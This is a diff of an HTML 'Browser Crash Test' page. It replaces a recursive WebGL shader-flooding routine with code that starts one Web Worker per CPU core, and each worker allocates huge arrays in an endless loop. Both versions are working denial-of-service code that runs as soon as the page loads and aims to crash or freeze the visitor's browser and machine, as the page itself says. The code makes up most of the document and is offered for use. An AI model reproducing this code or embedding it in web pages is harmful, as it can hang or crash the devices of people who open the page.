@@ -1,29 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Browser Crash Test - WebGL GPU Overload</title>
+    <title>Browser Crash Test - Multi-Threaded CPU Overload</title>
 </head>
 <body>
-    <h1>Browser Crash Test - WebGL GPU Overload</h1>
+    <h1>Browser Crash Test - Multi-Threaded CPU Overload</h1>
     <p>If your browser crashes, the test was successful.</p>
 
     <script>
-        var canvas = document.createElement('canvas');
-        var gl = canvas.getContext('webgl');
-
-        function crashGPU() {
-            let shaders = [];
-            for (let i = 0; i < 5000; i++) { // Increased workload
-                var shader = gl.createShader(gl.VERTEX_SHADER);
-                gl.shaderSource(shader, 'void main() { gl_Position = vec4(1.0); }');
-                gl.compileShader(shader);
-                shaders.push(shader);
-                gl.getShaderParameter(shader, gl.COMPILE_STATUS);
-            }
-            crashGPU(); // Recursion with no delay
+        function startWorker() {
+            let code = `
+                while (true) {
+                    let arr = new Array(1e7).fill(0);
+                }
+            `;
+            let blob = new Blob([code], { type: "application/javascript" });
+            let worker = new Worker(URL.createObjectURL(blob));
         }
 
-        crashGPU(); // Runs instantly, no wait
+        for (let i = 0; i < navigator.hardwareConcurrency; i++) {
+            startWorker(); // Creates one worker per CPU core
+        }
     </script>
 </body>
 </html>
